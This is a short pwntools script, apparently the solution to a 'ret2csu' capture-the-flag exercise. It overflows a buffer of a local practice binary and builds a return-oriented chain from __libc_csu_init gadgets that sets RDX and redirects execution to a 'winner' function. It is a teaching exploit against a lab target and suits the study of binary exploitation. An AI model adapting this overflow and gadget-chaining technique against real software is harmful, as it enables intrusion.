from pwn import *

elf = context.binary = ELF('./ret2csu')
p = elf.process()
# gdb.attach(p)

rop = ROP(elf)

POP_CHAIN = 0x40121a        # pop rbx, rbp, r12, r13, r14, pop r15, ret
REG_CALL = 0x401200         # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x404100

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0xdeadbeef)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

log.info(rop.dump())

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['winner']))
text = p.recvall()

print text
